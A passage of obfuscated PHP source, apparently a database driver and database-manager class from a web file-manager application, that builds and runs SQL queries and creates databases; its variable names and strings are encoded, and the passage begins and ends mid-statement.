(isset($‡·üŸˆÊ[0]) && is_string($‡·üŸˆÊ[0]) && strtolower($‡·üŸˆÊ[0]) == $üªÚ‚[296]) { $‡·üŸˆÊ = $this->escapeString($‡·üŸˆÊ[1]); } elseif (is_array($‡·üŸˆÊ)) { $‡·üŸˆÊ = array_map(array($this, $üªÚ‚[958]), $‡·üŸˆÊ); } elseif (is_bool($‡·üŸˆÊ)) { $‡·üŸˆÊ = $‡·üŸˆÊ ? $üªÚ‚[89] : $üªÚ‚[194]; } elseif (is_null($‡·üŸˆÊ)) { $‡·üŸˆÊ = $üªÚ‚[104]; } return $‡·üŸˆÊ; } protected function parseField($òÀ¨Ä †) { $» êÌ =& $_SERVER[Ôó‡è­ƒ]; if (is_string($òÀ¨Ä †) && strpos($òÀ¨Ä †, $» êÌ[50])) { $òÀ¨Ä † = explode($» êÌ[50], $òÀ¨Ä †); } if (is_array($òÀ¨Ä †)) { $ğ ø×å¥ = array(); foreach ($òÀ¨Ä † as $ıßĞøÊ¸ => $óÕ‚Ÿß…) { if (!is_numeric($ıßĞøÊ¸)) { $ğ ø×å¥[] = $this->parseKey($ıßĞøÊ¸, !1) . $» êÌ[998] . $this->parseKey($óÕ‚Ÿß…); } else { $ğ ø×å¥[] = $this->parseKey($óÕ‚Ÿß…); } } $ºÈ¼†ë = implode($» êÌ[50], $ğ ø×å¥); } elseif (is_string($òÀ¨Ä †) && !empty($òÀ¨Ä †)) { $ºÈ¼†ë = $òÀ¨Ä †; } else { $ºÈ¼†ë = $» êÌ[185]; } return $ºÈ¼†ë; } protected function parseTable($ôòç¼) { $¬»ºàü† =& $_SERVER[Ôó‡è­ƒ]; if (is_array($ôòç¼)) { $Ñ™³Äìä = array(); foreach ($ôòç¼ as $ï²Ò¾Ó => $æë£Áãå) { if (!is_numeric($ï²Ò¾Ó)) { $Ñ™³Äìä[] = $this->parseKey($ï²Ò¾Ó) . $¬»ºàü†[53] . $this->parseKey($æë£Áãå); } else { $Ñ™³Äìä[] = $this->parseKey($ï²Ò¾Ó); } } $ôòç¼ = $Ñ™³Äìä; } elseif (is_string($ôòç¼)) { if (strstr($ôòç¼, $¬»ºàü†[53])) { return $ôòç¼; } $ôòç¼ = explode($¬»ºàü†[50], $ôòç¼); array_walk($ôòç¼, array($this, $¬»ºàü†[906])); } return $¬»ºàü†[900] . trim(implode($¬»ºàü†[999], $ôòç¼), $¬»ºàü†[384]) . $¬»ºàü†[900]; } protected function parseWhere($ÔßÕÅ€) { $—¦° ºê =& $_SERVER[Ôó‡è­ƒ]; $Ï§µÁ‘ = $—¦° ºê[12]; if (is_string($ÔßÕÅ€)) { $Ï§µÁ‘ = $ÔßÕÅ€; } else { $óÀ†·•Ò = isset($ÔßÕÅ€[$—¦° ºê[1000]]) ? strtoupper($ÔßÕÅ€[$—¦° ºê[1000]]) : $—¦° ºê[12]; if (in_array($óÀ†·•Ò, array($—¦° ºê[1001], $—¦° ºê[1002], $—¦° ºê[1003]))) { $óÀ†·•Ò = $—¦° ºê[53] . $óÀ†·•Ò . $—¦° ºê[53]; unset($ÔßÕÅ€[$—¦° ºê[1000]]); } else { $óÀ†·•Ò = $—¦° ºê[1004]; } foreach ($ÔßÕÅ€ as $ÖËÔÚı => $Ã÷ÓæË¶) { $Ï§µÁ‘ .= $—¦° ºê[276]; if (is_numeric($ÖËÔÚı)) { $ÖËÔÚı = $—¦° ºê[1005]; } if (0 === strpos($ÖËÔÚı, $—¦° ºê[11])) { $Ï§µÁ‘ .= $this->parseThinkWhere($ÖËÔÚı, $Ã÷ÓæË¶); } else { if (!preg_match($—¦° ºê[1006], trim($ÖËÔÚı))) { think_exception(think_lang($—¦° ºê[1007]) . $—¦° ºê[4] . $ÖËÔÚı); } $éÇŸ÷ = is_array($Ã÷ÓæË¶) && isset($Ã÷ÓæË¶[$—¦° ºê[1008]]); $ÖËÔÚı = trim($ÖËÔÚı); if (strpos($ÖËÔÚı, $—¦° ºê[282])) { $‡ñ©Ë¸æ = explode($—¦° ºê[282], $ÖËÔÚı); $Üˆáïå« = array(); foreach ($‡ñ©Ë¸æ as $ëè‘Œ¶Ú => $Ÿß·ü¸õ) { $ ›ÕêÎ = $éÇŸ÷ ? $Ã÷ÓæË¶[$ëè‘Œ¶Ú] : $Ã÷ÓæË¶; $Üˆáïå«[] = $—¦° ºê[259] . $this->parseWhereItem($this->parseKey($Ÿß·ü¸õ), $ ›ÕêÎ) . $—¦° ºê[905]; } $Ï§µÁ‘ .= implode($—¦° ºê[1009], $Üˆáïå«); } elseif (strpos($ÖËÔÚı, $—¦° ºê[283])) { $‡ñ©Ë¸æ = explode($—¦° ºê[283], $ÖËÔÚı); $Üˆáïå« = array(); foreach ($‡ñ©Ë¸æ as $ëè‘Œ¶Ú => $Ÿß·ü¸õ) { $ ›ÕêÎ = $éÇŸ÷ ? $Ã÷ÓæË¶[$ëè‘Œ¶Ú] : $Ã÷ÓæË¶; $Üˆáïå«[] = $—¦° ºê[259] . $this->parseWhereItem($this->parseKey($Ÿß·ü¸õ), $ ›ÕêÎ) . $—¦° ºê[905]; } $Ï§µÁ‘ .= implode($—¦° ºê[1004], $Üˆáïå«); } else { $Ï§µÁ‘ .= $this->parseWhereItem($this->parseKey($ÖËÔÚı), $Ã÷ÓæË¶); } } $Ï§µÁ‘ .= $—¦° ºê[277] . $óÀ†·•Ò; } $Ï§µÁ‘ = substr($Ï§µÁ‘, 0, -strlen($óÀ†·•Ò)); } return empty($Ï§µÁ‘) ? $—¦° ºê[12] : $—¦° ºê[1010] . $Ï§µÁ‘; } protected function parseWhereItem($İÎ»ÊÌï, $Ì°ÉÄŞğ) { $‘è‰«†„ =& $_SERVER[Ôó‡è­ƒ]; $È­±ÇĞâ = $‘è‰«†„[12]; if (is_array($Ì°ÉÄŞğ)) { if (is_string($Ì°ÉÄŞğ[0])) { $·äÓÛ = strtolower($Ì°ÉÄŞğ[0]); if (in_array($Ì°ÉÄŞğ[0], array($‘è‰«†„[884], $‘è‰«†„[1011], $‘è‰«†„[1012], $‘è‰«†„[1013], $‘è‰«†„[1014], $‘è‰«†„[1015]))) { $È­±ÇĞâ .= $İÎ»ÊÌï . $‘è‰«†„[53] . $Ì°ÉÄŞğ[0] . $‘è‰«†„[53] . $this->parseValue($Ì°ÉÄŞğ[1]); } elseif (preg_match($‘è‰«†„[1016], $Ì°ÉÄŞğ[0])) { $È­±ÇĞâ .= $İÎ»ÊÌï . $‘è‰«†„[53] . $this->exp[$·äÓÛ] . $‘è‰«†„[53] . $this->parseValue($Ì°ÉÄŞğ[1]); } elseif (preg_match($‘è‰«†„[1017], $Ì°ÉÄŞğ[0])) { if (is_array($Ì°ÉÄŞğ[1])) { $’ˆöñÖï = isset($Ì°ÉÄŞğ[2]) ? strtoupper($Ì°ÉÄŞğ[2]) : $‘è‰«†„[1002]; if (in_array($’ˆöñÖï, array($‘è‰«†„[1001], $‘è‰«†„[1002], $‘è‰«†„[1003]))) { $¹€œêæÇ = array(); foreach ($Ì°ÉÄŞğ[1] as $¶ùüßó) { $¹€œêæÇ[] = $İÎ»ÊÌï . $‘è‰«†„[53] . $this->exp[$·äÓÛ] . $‘è‰«†„[53] . $this->parseValue($¶ùüßó); } $È­±ÇĞâ .= $‘è‰«†„[259] . implode($‘è‰«†„[53] . $’ˆöñÖï . $‘è‰«†„[53], $¹€œêæÇ) . $‘è‰«†„[905]; } } else { $È­±ÇĞâ .= $İÎ»ÊÌï . $‘è‰«†„[53] . $this->exp[$·äÓÛ] . $‘è‰«†„[53] . $this->parseValue($Ì°ÉÄŞğ[1]); } } elseif ($‘è‰«†„[296] == $·äÓÛ) { $È­±ÇĞâ .= $‘è‰«†„[903] . $İÎ»ÊÌï . $‘è‰«†„[53] . $Ì°ÉÄŞğ[1] . $‘è‰«†„[1018]; } elseif (preg_match($‘è‰«†„[1019], $Ì°ÉÄŞğ[0])) { $È­±ÇĞâ .= $Ì°ÉÄŞğ[0]; } elseif (preg_match($‘è‰«†„[1020], $Ì°ÉÄŞğ[0])) { if (isset($Ì°ÉÄŞğ[2]) && $‘è‰«†„[296] == $Ì°ÉÄŞğ[2]) { $È­±ÇĞâ .= $İÎ»ÊÌï . $‘è‰«†„[53] . $this->exp[$·äÓÛ] . $‘è‰«†„[53] . $Ì°ÉÄŞğ[1]; } else { if (is_string($Ì°ÉÄŞğ[1])) { $Ì°ÉÄŞğ[1] = explode($‘è‰«†„[50], $Ì°ÉÄŞğ[1]); } $¼¢ñ›ä = implode($‘è‰«†„[50], $this->parseValue($Ì°ÉÄŞğ[1])); $È­±ÇĞâ .= $İÎ»ÊÌï . $‘è‰«†„[53] . $this->exp[$·äÓÛ] . $‘è‰«†„[903] . $¼¢ñ›ä . $‘è‰«†„[905]; } } elseif (preg_match($‘è‰«†„[1021], $Ì°ÉÄŞğ[0])) { $‚ˆ‹˜ãâ = is_string($Ì°ÉÄŞğ[1]) ? explode($‘è‰«†„[50], $Ì°ÉÄŞğ[1]) : $Ì°ÉÄŞğ[1]; $È­±ÇĞâ .= $‘è‰«†„[903] . $İÎ»ÊÌï . $‘è‰«†„[53] . $this->exp[$·äÓÛ] . $‘è‰«†„[53] . $this->parseValue($‚ˆ‹˜ãâ[0]) . $‘è‰«†„[1004] . $this->parseValue($‚ˆ‹˜ãâ[1]) . $‘è‰«†„[277]; } else { think_exception(think_lang($‘è‰«†„[1007]) . $‘è‰«†„[4] . $Ì°ÉÄŞğ[0]); } } else { $üŞé¿öØ = count($Ì°ÉÄŞğ); $¨¢é¼›„ = $‘è‰«†„[12]; if (is_string($Ì°ÉÄŞğ[$üŞé¿öØ - 1])) { $¨¢é¼›„ = isset($Ì°ÉÄŞğ[$üŞé¿öØ - 1]) ? strtoupper($Ì°ÉÄŞğ[$üŞé¿öØ - 1]) : $‘è‰«†„[12]; if (in_array($¨¢é¼›„, array($‘è‰«†„[1001], $‘è‰«†„[1002], $‘è‰«†„[1003]))) { $üŞé¿öØ = $üŞé¿öØ - 1; } } else { $¨¢é¼›„ = $‘è‰«†„[1001]; } for ($“ñâğú× = 0; $“ñâğú× < $üŞé¿öØ; $“ñâğú×++) { $‚ˆ‹˜ãâ = is_array($Ì°ÉÄŞğ[$“ñâğú×]) ? $Ì°ÉÄŞğ[$“ñâğú×][1] : $Ì°ÉÄŞğ[$“ñâğú×]; if ($‘è‰«†„[296] == strtolower($Ì°ÉÄŞğ[$“ñâğú×][0])) { $È­±ÇĞâ .= $‘è‰«†„[259] . $İÎ»ÊÌï . $‘è‰«†„[53] . $‚ˆ‹˜ãâ . $‘è‰«†„[1018] . $¨¢é¼›„ . $‘è‰«†„[53]; } else { $À³Ê©ßÅ = is_array($Ì°ÉÄŞğ[$“ñâğú×]) ? $this->exp[strtolower($Ì°ÉÄŞğ[$“ñâğú×][0])] : $‘è‰«†„[884]; if (!$À³Ê©ßÅ && is_array($Ì°ÉÄŞğ[$“ñâğú×]) && in_array($Ì°ÉÄŞğ[$“ñâğú×][0], array($‘è‰«†„[884], $‘è‰«†„[1011], $‘è‰«†„[1012], $‘è‰«†„[1013], $‘è‰«†„[1014], $‘è‰«†„[1015]))) { $À³Ê©ßÅ = $Ì°ÉÄŞğ[$“ñâğú×][0]; } $È­±ÇĞâ .= $‘è‰«†„[259] . $İÎ»ÊÌï . $‘è‰«†„[53] . $À³Ê©ßÅ . $‘è‰«†„[53] . $this->parseValue($‚ˆ‹˜ãâ) . $‘è‰«†„[1018] . $¨¢é¼›„ . $‘è‰«†„[53]; } } $È­±ÇĞâ = substr($È­±ÇĞâ, 0, -4); } } else { $È­±ÇĞâ .= $İÎ»ÊÌï . $‘è‰«†„[1022] . $this->parseValue($Ì°ÉÄŞğ); } return $È­±ÇĞâ; } protected function parseThinkWhere($®¢Û²ßÜ, $í„¥¶˜á) { $Íì¢İš =& $_SERVER[Ôó‡è­ƒ]; $ì€’Åû¤ = $Íì¢İš[12]; switch ($®¢Û²ßÜ) { case $Íì¢İš[351]: $ì€’Åû¤ = $í„¥¶˜á; break; case $Íì¢İš[1005]: $ì€’Åû¤ = is_string($í„¥¶˜á) ? $í„¥¶˜á : substr($this->parseWhere($í„¥¶˜á), 6); break; case $Íì¢İš[1023]: parse_str($í„¥¶˜á, $èÔ‰ÍÈ¾); if (isset($èÔ‰ÍÈ¾[$Íì¢İš[1000]])) { $Íµö˜ã‚ = $Íì¢İš[53] . strtoupper($èÔ‰ÍÈ¾[$Íì¢İš[1000]]) . $Íì¢İš[53]; unset($èÔ‰ÍÈ¾[$Íì¢İš[1000]]); } else { $Íµö˜ã‚ = $Íì¢İš[1004]; } $¨â³íê¹ = array(); foreach ($èÔ‰ÍÈ¾ as $—¿ÇõŠ« => $æìÅú÷) { $¨â³íê¹[] = $this->parseKey($—¿ÇõŠ«) . $Íì¢İš[1022] . $this->parseValue($æìÅú÷); } $ì€’Åû¤ = implode($Íµö˜ã‚, $¨â³íê¹); break; } return $ì€’Åû¤; } protected function parseLimit($×óéŠ—ú) { $Â°×¶Ş =& $_SERVER[Ôó‡è­ƒ]; return !empty($×óéŠ—ú) ? $Â°×¶Ş[51] . $×óéŠ—ú . $Â°×¶Ş[53] : $Â°×¶Ş[12]; } protected function parseJoin($“‡†¯¬Ï) { $öÎ™ù÷È =& $_SERVER[Ôó‡è­ƒ]; $Ûœø¾¯Í = $öÎ™ù÷È[12]; if (!empty($“‡†¯¬Ï)) { if (is_array($“‡†¯¬Ï)) { foreach ($“‡†¯¬Ï as $ê÷Îƒî => $Èì’ÖŞ) { if (!1 !== stripos($Èì’ÖŞ, $öÎ™ù÷È[1024])) { $Ûœø¾¯Í .= $öÎ™ù÷È[53] . $Èì’ÖŞ; } else { $Ûœø¾¯Í .= $öÎ™ù÷È[1025] . $Èì’ÖŞ; } } } else { $Ûœø¾¯Í .= $öÎ™ù÷È[1025] . $“‡†¯¬Ï; } } $Ûœø¾¯Í = preg_replace($öÎ™ù÷È[1026], think_config($öÎ™ù÷È[930]) . $öÎ™ù÷È[1027], $Ûœø¾¯Í); return $Ûœø¾¯Í; } protected function parseOrder($ÚãâáŞš) { $¼Õ’èìÉ =& $_SERVER[Ôó‡è­ƒ]; if (is_array($ÚãâáŞš)) { $ÜáĞ€Æ = array(); foreach ($ÚãâáŞš as $âÏŒİ½À => $İğâåö¾) { if (is_numeric($âÏŒİ½À)) { $ÜáĞ€Æ[] = $this->parseKey($İğâåö¾); } else { $İğâåö¾ = in_array(strtoupper(trim($İğâåö¾)), array($¼Õ’èìÉ[1028], $¼Õ’èìÉ[1029])) ? $¼Õ’èìÉ[53] . $İğâåö¾ : $¼Õ’èìÉ[12]; if (preg_match($¼Õ’èìÉ[1030], $âÏŒİ½À)) { $ÜáĞ€Æ[] = $this->parseKey($âÏŒİ½À) . $İğâåö¾; } else { think_exception($¼Õ’èìÉ[1031] . $âÏŒİ½À); } } } $ÚãâáŞš = implode($¼Õ’èìÉ[50], $ÜáĞ€Æ); } return !empty($ÚãâáŞš) ? $¼Õ’èìÉ[1032] . $ÚãâáŞš : $¼Õ’èìÉ[12]; } protected function parseGroup($õÅ•­Ù‘) { $·üÍ» ‚ =& $_SERVER[Ôó‡è­ƒ]; return !empty($õÅ•­Ù‘) ? $·üÍ» ‚[1033] . $õÅ•­Ù‘ : $·üÍ» ‚[12]; } protected function parseHaving($ëèªß›) { $™Àñ¦˜ =& $_SERVER[Ôó‡è­ƒ]; return !empty($ëèªß›) ? $™Àñ¦˜[1034] . $ëèªß› : $™Àñ¦˜[12]; } protected function parseComment($‹ëçÑ‚›) { $Ìù™õ¸ =& $_SERVER[Ôó‡è­ƒ]; return !empty($‹ëçÑ‚›) ? $Ìù™õ¸[1035] . $‹ëçÑ‚› . $Ìù™õ¸[1036] : $Ìù™õ¸[12]; } protected function parseDistinct($¥èÒ¼€) { $ØÚî¶ =& $_SERVER[Ôó‡è­ƒ]; return !empty($¥èÒ¼€) ? $ØÚî¶[1037] : $ØÚî¶[12]; } protected function parseUnion($÷šğšœ) { $ÆÌÀñÁÌ =& $_SERVER[Ôó‡è­ƒ]; if (empty($÷šğšœ)) { return $ÆÌÀñÁÌ[12]; } if (isset($÷šğšœ[$ÆÌÀñÁÌ[347]])) { $óÙæÒà = $ÆÌÀñÁÌ[1038]; unset($÷šğšœ[$ÆÌÀñÁÌ[347]]); } else { $óÙæÒà = $ÆÌÀñÁÌ[1039]; } foreach ($÷šğšœ as $ì”ÁÌ¼¹) { $ÛÆé•è±[] = $óÙæÒà . (is_array($ì”ÁÌ¼¹) ? $this->buildSelectSql($ì”ÁÌ¼¹) : $ì”ÁÌ¼¹); } return implode($ÆÌÀñÁÌ[53], $ÛÆé•è±); } public function insert($ÓÎÇ³÷, $ËÚ•‹†ù = array(), $ÄÜÃÔÓ“ = false) { $úÖÛš«… =& $_SERVER[Ôó‡è­ƒ]; $àŞ­¤æ² = $éé•¯ = array(); $this->model = $ËÚ•‹†ù[$úÖÛš«…[280]]; foreach ($ÓÎÇ³÷ as $–İÅ€Šâ => $ª•àí¢È) { if (is_array($ª•àí¢È) && $úÖÛš«…[296] == $ª•àí¢È[0]) { $éé•¯[] = $this->parseKey($–İÅ€Šâ); $àŞ­¤æ²[] = $ª•àí¢È[1]; } elseif (is_scalar($ª•àí¢È) || is_null($ª•àí¢È)) { $éé•¯[] = $this->parseKey($–İÅ€Šâ); $àŞ­¤æ²[] = $this->parseValue($ª•àí¢È); } } $ÓËÂ©ßì = ($ÄÜÃÔÓ“ ? $úÖÛš«…[907] : $úÖÛš«…[908]) . $úÖÛš«…[909] . $this->parseTable($ËÚ•‹†ù[$úÖÛš«…[278]]) . $úÖÛš«…[903] . implode($úÖÛš«…[50], $éé•¯) . $úÖÛš«…[904] . implode($úÖÛš«…[50], $àŞ­¤æ²) . $úÖÛš«…[905]; $ÓËÂ©ßì .= $this->parseLock(isset($ËÚ•‹†ù[$úÖÛš«…[841]]) ? $ËÚ•‹†ù[$úÖÛš«…[841]] : !1); $ÓËÂ©ßì .= $this->parseComment(!empty($ËÚ•‹†ù[$úÖÛš«…[353]]) ? $ËÚ•‹†ù[$úÖÛš«…[353]] : $úÖÛš«…[12]); return $this->execute($ÓËÂ©ßì, $this->parseBind(!empty($ËÚ•‹†ù[$úÖÛš«…[284]]) ? $ËÚ•‹†ù[$úÖÛš«…[284]] : array())); } public function selectInsert($ƒÔş˜ˆú, $ç§Å†…Ò, $ÕØ‡Éµğ = array()) { $Ğ¾œÛŒé =& $_SERVER[Ôó‡è­ƒ]; $this->model = $ÕØ‡Éµğ[$Ğ¾œÛŒé[280]]; if (is_string($ƒÔş˜ˆú)) { $ƒÔş˜ˆú = explode($Ğ¾œÛŒé[50], $ƒÔş˜ˆú); } array_walk($ƒÔş˜ˆú, array($this, $Ğ¾œÛŒé[906])); $¤‡‹ğ…Ë = $Ğ¾œÛŒé[1040] . $this->parseTable($ç§Å†…Ò) . $Ğ¾œÛŒé[903] . implode($Ğ¾œÛŒé[50], $ƒÔş˜ˆú) . $Ğ¾œÛŒé[1018]; $¤‡‹ğ…Ë .= $this->buildSelectSql($ÕØ‡Éµğ); return $this->execute($¤‡‹ğ…Ë, $this->parseBind(!empty($ÕØ‡Éµğ[$Ğ¾œÛŒé[284]]) ? $ÕØ‡Éµğ[$Ğ¾œÛŒé[284]] : array())); } public function update($ë‹ÏÄæá, $µüôÁ†‰) { $’äğàİ… =& $_SERVER[Ôó‡è­ƒ]; $this->model = $µüôÁ†‰[$’äğàİ…[280]]; $‹úàè› = $’äğàİ…[1041] . $this->parseTable($µüôÁ†‰[$’äğàİ…[278]]) . $this->parseSet($ë‹ÏÄæá) . $this->parseWhere(!empty($µüôÁ†‰[$’äğàİ…[274]]) ? $µüôÁ†‰[$’äğàİ…[274]] : $’äğàİ…[12]) . $this->parseOrder(!empty($µüôÁ†‰[$’äğàİ…[364]]) ? $µüôÁ†‰[$’äğàİ…[364]] : $’äğàİ…[12]) . $this->parseLimit(!empty($µüôÁ†‰[$’äğàİ…[291]]) ? $µüôÁ†‰[$’äğàİ…[291]] : $’äğàİ…[12]) . $this->parseLock(isset($µüôÁ†‰[$’äğàİ…[841]]) ? $µüôÁ†‰[$’äğàİ…[841]] : !1) . $this->parseComment(!empty($µüôÁ†‰[$’äğàİ…[353]]) ? $µüôÁ†‰[$’äğàİ…[353]] : $’äğàİ…[12]); return $this->execute($‹úàè›, $this->parseBind(!empty($µüôÁ†‰[$’äğàİ…[284]]) ? $µüôÁ†‰[$’äğàİ…[284]] : array())); } public function delete($´Í‚ÇŒ— = array()) { $šØÕ“ÛÚ =& $_SERVER[Ôó‡è­ƒ]; $this->model = $´Í‚ÇŒ—[$šØÕ“ÛÚ[280]]; $³ŸçÅÊ‚ = $šØÕ“ÛÚ[1042] . $this->parseTable($´Í‚ÇŒ—[$šØÕ“ÛÚ[278]]) . $this->parseWhere(!empty($´Í‚ÇŒ—[$šØÕ“ÛÚ[274]]) ? $´Í‚ÇŒ—[$šØÕ“ÛÚ[274]] : $šØÕ“ÛÚ[12]) . $this->parseOrder(!empty($´Í‚ÇŒ—[$šØÕ“ÛÚ[364]]) ? $´Í‚ÇŒ—[$šØÕ“ÛÚ[364]] : $šØÕ“ÛÚ[12]) . $this->parseLimit(!empty($´Í‚ÇŒ—[$šØÕ“ÛÚ[291]]) ? $´Í‚ÇŒ—[$šØÕ“ÛÚ[291]] : $šØÕ“ÛÚ[12]) . $this->parseLock(isset($´Í‚ÇŒ—[$šØÕ“ÛÚ[841]]) ? $´Í‚ÇŒ—[$šØÕ“ÛÚ[841]] : !1) . $this->parseComment(!empty($´Í‚ÇŒ—[$šØÕ“ÛÚ[353]]) ? $´Í‚ÇŒ—[$šØÕ“ÛÚ[353]] : $šØÕ“ÛÚ[12]); return $this->execute($³ŸçÅÊ‚, $this->parseBind(!empty($´Í‚ÇŒ—[$šØÕ“ÛÚ[284]]) ? $´Í‚ÇŒ—[$šØÕ“ÛÚ[284]] : array())); } public function select($ôñæ‡§ = array()) { $€ê¯¤¹ =& $_SERVER[Ôó‡è­ƒ]; $this->model = $ôñæ‡§[$€ê¯¤¹[280]]; $ø³¢—Ö = $this->buildSelectSql($ôñæ‡§); $Ûç„şÎ = isset($ôñæ‡§[$€ê¯¤¹[348]]) ? $ôñæ‡§[$€ê¯¤¹[348]] : !1; if ($Ûç„şÎ) { $İãöß¶ü = is_string($Ûç„şÎ[$€ê¯¤¹[95]]) ? $Ûç„şÎ[$€ê¯¤¹[95]] : $€ê¯¤¹[1043] . md5($ø³¢—Ö); $Æúö× ¨ = think_cache($İãöß¶ü, $€ê¯¤¹[12], $Ûç„şÎ); if (!1 !== $Æúö× ¨) { return $Æúö× ¨; } } $¢ÙÕò®È = $this->query($ø³¢—Ö, $this->parseBind(!empty($ôñæ‡§[$€ê¯¤¹[284]]) ? $ôñæ‡§[$€ê¯¤¹[284]] : array())); if ($Ûç„şÎ && !1 !== $¢ÙÕò®È) { think_cache($İãöß¶ü, $¢ÙÕò®È, $Ûç„şÎ); } return $¢ÙÕò®È; } public function buildSelectSql($Æ¼äĞäİ = array()) { $öØ×ÄãÂ =& $_SERVER[Ôó‡è­ƒ]; if (isset($Æ¼äĞäİ[$öØ×ÄãÂ[352]])) { if (strpos($Æ¼äĞäİ[$öØ×ÄãÂ[352]], $öØ×ÄãÂ[50])) { list($ù‡èÆû, $·ÚÂòğ) = explode($öØ×ÄãÂ[50], $Æ¼äĞäİ[$öØ×ÄãÂ[352]]); } else { $ù‡èÆû = $Æ¼äĞäİ[$öØ×ÄãÂ[352]]; } $ù‡èÆû = $ù‡èÆû ? $ù‡èÆû : 1; $·ÚÂòğ = isset($·ÚÂòğ) ? $·ÚÂòğ : (is_numeric($Æ¼äĞäİ[$öØ×ÄãÂ[291]]) ? $Æ¼äĞäİ[$öØ×ÄãÂ[291]] : 20); $­»¥„Öä = $·ÚÂòğ * ((int) $ù‡èÆû - 1); $Æ¼äĞäİ[$öØ×ÄãÂ[291]] = $­»¥„Öä . $öØ×ÄãÂ[50] . $·ÚÂòğ; } if (think_config($öØ×ÄãÂ[1044])) { $ŠˆÕ‹È = $öØ×ÄãÂ[1045] . md5(serialize($Æ¼äĞäİ)); $š¾æ™Ûç = think_cache($ŠˆÕ‹È); if ($š¾æ™Ûç) { return $š¾æ™Ûç; } } $¨ì»ı×ı = $this->parseSql($this->selectSql, $Æ¼äĞäİ); $¨ì»ı×ı .= $this->parseLock(isset($Æ¼äĞäİ[$öØ×ÄãÂ[841]]) ? $Æ¼äĞäİ[$öØ×ÄãÂ[841]] : !1); if (isset($ŠˆÕ‹È)) { think_cache($ŠˆÕ‹È, $¨ì»ı×ı); } return $¨ì»ı×ı; } public function parseSql($ê©•‡€ù, $•âÔËµÀ = array()) { $Å„Ãû› =& $_SERVER[Ôó‡è­ƒ]; $ê©•‡€ù = str_replace(array($Å„Ãû›[1046], $Å„Ãû›[1047], $Å„Ãû›[1048], $Å„Ãû›[1049], $Å„Ãû›[1050], $Å„Ãû›[1051], $Å„Ãû›[1052], $Å„Ãû›[1053], $Å„Ãû›[1054], $Å„Ãû›[1055], $Å„Ãû›[1056]), array($this->parseTable("{$•âÔËµÀ[$Å„Ãû›[278]]}"), $this->parseDistinct(isset($•âÔËµÀ[$Å„Ãû›[1057]]) ? $•âÔËµÀ[$Å„Ãû›[1057]] : !1), $this->parseField(!empty($•âÔËµÀ[$Å„Ãû›[272]]) ? $•âÔËµÀ[$Å„Ãû›[272]] : $Å„Ãû›[185]), $this->parseJoin(!empty($•âÔËµÀ[$Å„Ãû›[281]]) ? $•âÔËµÀ[$Å„Ãû›[281]] : $Å„Ãû›[12]), $this->parseWhere(!empty($•âÔËµÀ[$Å„Ãû›[274]]) ? $•âÔËµÀ[$Å„Ãû›[274]] : $Å„Ãû›[12]), $this->parseGroup(!empty($•âÔËµÀ[$Å„Ãû›[511]]) ? $•âÔËµÀ[$Å„Ãû›[511]] : $Å„Ãû›[12]), $this->parseHaving(!empty($•âÔËµÀ[$Å„Ãû›[1058]]) ? $•âÔËµÀ[$Å„Ãû›[1058]] : $Å„Ãû›[12]), $this->parseOrder(!empty($•âÔËµÀ[$Å„Ãû›[364]]) ? $•âÔËµÀ[$Å„Ãû›[364]] : $Å„Ãû›[12]), $this->parseLimit(!empty($•âÔËµÀ[$Å„Ãû›[291]]) ? $•âÔËµÀ[$Å„Ãû›[291]] : $Å„Ãû›[12]), $this->parseUnion(!empty($•âÔËµÀ[$Å„Ãû›[346]]) ? $•âÔËµÀ[$Å„Ãû›[346]] : $Å„Ãû›[12]), $this->parseComment(!empty($•âÔËµÀ[$Å„Ãû›[353]]) ? $•âÔËµÀ[$Å„Ãû›[353]] : $Å„Ãû›[12])), $ê©•‡€ù); return $ê©•‡€ù; } public function getLastSql($Ì±åğãÊ = '') { return $Ì±åğãÊ ? $this->modelSql[$Ì±åğãÊ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¯é¦İ…) { return addslashes($¯é¦İ…); } public function setModel($¢¥ë–ê) { $this->model = $¢¥ë–ê; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ŒÎ¤Øê£ = array()) { $Ğ©“é…Î =& $_SERVER[Ôó‡è­ƒ]; if (empty($ŒÎ¤Øê£)) { $ŒÎ¤Øê£ = $GLOBALS[$Ğ©“é…Î[6]][$Ğ©“é…Î[21]]; } $this->database = $ŒÎ¤Øê£; } public function model($µÑ³•„Ÿ = '') { return new ModelBase($µÑ³•„Ÿ, $_SERVER[Ôó‡è­ƒ][12], $this->database); } public function db($í‰Í„ª = false) { $ˆƒñõ±œ =& $_SERVER[Ôó‡è­ƒ]; $¡¥Îİİ  = array_change_key_case($this->database); if ($this->dbType() == $ˆƒñõ±œ[13] || !$í‰Í„ª) { return $this->model()->db(); } $ Éä‘¿ª = $¡¥Îİİ [$ˆƒñõ±œ[972]]; $¡¥Îİİ [$ˆƒñõ±œ[972]] = $ˆƒñõ±œ[12]; if ($¡¥Îİİ [$ˆƒñõ±œ[967]] == $ˆƒñõ±œ[964]) { $ìÆº…—É = $¡¥Îİİ [$ˆƒñõ±œ[973]]; $¡¥Îİİ [$ˆƒñõ±œ[973]] = substr($ìÆº…—É, 0, strrpos($ìÆº…—É, $ˆƒñõ±œ[1059])); } $this->database = $¡¥Îİİ ; $ï¼Ê×œÔ = $this->model()->db(); try { $‚†•ò¤» = $ï¼Ê×œÔ->execute("\163\150\157\x77\40\144\x61\164\x61\x62\141\x73\x65\163\x20\x6c\151\153\x65\40\47{$ Éä‘¿ª}\47"); } catch (Exception $£Ñûç¶À) { } if (!$‚†•ò¤») { $ï¼Ê×œÔ->execute("\143\162\145\141\164\x65\40\144\141\164\141\x62\141\163\145\40\x60{$ Éä‘¿ª}\140"); } $¡¥Îİİ [$ˆƒñõ±œ[972]] = $ Éä‘¿ª; if ($¡¥Îİİ [$ˆƒñõ±œ[967]] == $ˆƒñõ±œ[964]) { $¡¥Îİİ [$ˆƒñõ±œ[973]] .= $ˆƒñõ±œ[1059] . $ Éä‘¿ª; } $this->database = $¡¥Îİİ ; $ï¼Ê×œÔ->execute("\x75\163\x65\40\140{$ Éä‘¿ª}\140"); return $ï¼Ê×œÔ; } public function createTable($ğ¯§¯¿÷, &$·Áö¬”ç) { $·ÇÄ‰Ğ¸ =& $_SERVER[Ôó‡è­ƒ]; if (!IO::exist($ğ¯§¯¿÷)) { ActionCall($·ÇÄ‰Ğ¸[1060], !0, 0); show_json(LNG($·ÇÄ‰Ğ¸[1061]), !1); } $³§—Ú•¸ = $this->model()->db(); $î©ü‹‹ = 